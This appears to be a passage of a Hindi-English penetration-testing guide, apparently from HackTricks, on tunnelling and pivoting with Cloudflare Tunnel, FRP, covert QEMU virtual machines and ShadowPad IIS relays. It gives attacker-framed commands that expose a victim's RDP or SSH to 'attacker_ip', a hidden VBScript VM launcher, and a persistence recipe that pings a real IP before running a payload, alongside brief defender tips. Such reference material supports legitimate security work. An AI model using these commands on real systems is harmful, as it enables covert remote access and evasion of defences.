स्थानीय रूप से प्रबंधित tunnel configuration में नीचे दिखाए गए lower-case `tunnel`, `credentials-file`, और `url` keys का उपयोग किया जाता है।<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Connector शुरू करें:
```bash
cloudflared tunnel run mytunnel
```
Connector outbound connections स्थापित करता है और, default रूप से, fallback के रूप में HTTP/2 के साथ QUIC negotiate करता है; यह assume न करें कि हर deployment TCP/443 का उपयोग करता है। इसे अपने deployment के लिए आवश्यक privileges के साथ ही चलाएँ।<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) एक Go reverse proxy है जो **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX, और XTCP** को support करता है। XTCP P2P hole punching का उपयोग करता है, जिसकी सफलता NAT पर निर्भर करती है। **v0.53.0** से यह **SSH Tunnel Gateway** के रूप में कार्य कर सकता है, इसलिए target host `frpc` binary के बिना stock OpenSSH client का उपयोग कर सकता है।<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### नए SSH gateway का उपयोग (frpc binary के बिना)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
ऊपर दिया गया command stock OpenSSH client का उपयोग करके victim के **8080** port को **attacker_ip:9000** के रूप में publish करता है, जबकि `frps` gateway प्रदान करता है।<sup>[[50]](#references)</sup>

## QEMU के साथ Covert VM-based Tunnels

QEMU user-mode networking को virtual network के लिए root या administrator privilege की आवश्यकता नहीं होती, और `-netdev user,hostfwd=...` host से guest तक TCP, UDP या UNIX connections को redirect करता है।<sup>[[51]](#references)</sup> TrustedSec ने एक incident में Tiny Core QEMU VM और attempted reverse SSH tunnel का documentation किया, जिसमें host-focused EDR guest के अंदर की activity को miss कर सकता था।<sup>[[1]](#references)</sup>

### Quick one-liner
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• ऊपर दिया गया command **Tiny Core Linux** guest को 256 MiB guest memory और qcow2 disk image के साथ launch करता है; disk image in-RAM disk नहीं है।
• Windows host पर **2222/tcp** port transparently guest के अंदर **22/tcp** पर forward किया जाता है।
• Attacker के दृष्टिकोण से target केवल port 2222 expose करता है; उस तक पहुँचने वाले सभी packets VM में चल रहे SSH server द्वारा handle किए जाते हैं।

### VBScript के माध्यम से stealthily launch करना

TrustedSec ने ऊपर उल्लिखित incident d में VBS-driven QEMU launches और Tiny Core images देखीं।<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs` के साथ script चलाने पर window छिपी रहती है।<sup>[[1]](#references)</sup>

### In-guest persistence

d incident में stateless Tiny Core guest में `/opt/bootlocal.sh` और `/opt/filetool.lst` के माध्यम से persistence का वर्णन किया गया है:<sup>[[1]](#references)</sup>

1. Payload को `/opt/123.out` में डालें
2. `/opt/bootlocal.sh` में जोड़ें:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `/opt/filetool.lst` में `home/tc` और `opt` जोड़ें, ताकि shutdown के समय payload को `mydata.tgz` में पैक किया जाए।

### Telemetry considerations

• Host अभी भी QEMU process, qcow2 image और किसी भी host-forwarded listener को expose करता है।
• केवल host-side process scans guest processes का निरीक्षण नहीं कर सकते, लेकिन virtualization से evasion की गारंटी नहीं मिलती; network, QEMU और image telemetry अभी भी इसे expose कर सकती है।<sup>[[1]](#references)[[51]](#references)</sup>

### Defender tips

• User-writable paths में **unexpected QEMU/VirtualBox/KVM binaries** पर alert करें।
• `qemu-system*.exe` से शुरू होने वाले outbound connections को block करें।
• ऐसे rare listening ports (2222, 10022, …) के लिए hunt करें, जो QEMU launch के तुरंत बाद bind होते हैं।

## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)

Check Point के अनुसार, ShadowPad का IIS module `HttpAddUrl` के माध्यम से URL prefixes को bind करके compromised perimeter web servers को backdoor और relay nodes में बदलता है।<sup>[[3]](#references)</sup>

उसी report में defaults, wildcard listeners, packet decryption, relay queues और नीचे संक्षेप में दिए गए debug telemetry का विवरण है।<sup>[[3]](#references)</sup>

* **Config defaults** – यदि module का JSON config कुछ values को omit करता है, तो यह विश्वसनीय IIS defaults (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`) पर fallback करता है। इस तरह benign traffic का उत्तर IIS सही branding के साथ देता है।
* **Wildcard interception** – operators URL prefixes की semicolon-separated list देते हैं (host + path में wildcards)। Module प्रत्येक entry के लिए `HttpAddUrl` call करता है, इसलिए HTTP.sys matching requests को malicious handler तक route करता है; nonmatching requests सामान्य IIS behavior पर fallback होती हैं।
* **Encrypted first packet** – request body के पहले दो bytes custom 32-bit PRNG के लिए seed रखते हैं। Protocol parsing से पहले प्रत्येक subsequent byte को generated keystream के साथ XOR किया जाता है:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module दो lists maintain करता है: “servers” (upstream nodes) और “clients” (downstream implants)। यदि लगभग 30 seconds के भीतर heartbeat नहीं आता, तो entries को prune कर दिया जाता है। जब दोनों lists non-empty होती हैं, तो यह पहले healthy server को पहले healthy client के साथ pair करता है और एक side के close होने तक उनके sockets के बीच bytes को simply pipe करता है।
* **Debug telemetry** – optional logging प्रत्येक pairing के लिए source IP, destination IP और कुल forwarded bytes record करता है। Investigators ने इन breadcrumbs का उपयोग कई victims तक फैले ShadowPad mesh को rebuild करने के लिए किया।

---

## जाँचने के लिए अन्य tools

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Bypass Firewall/IDS Restrictions](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Pivoting in Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
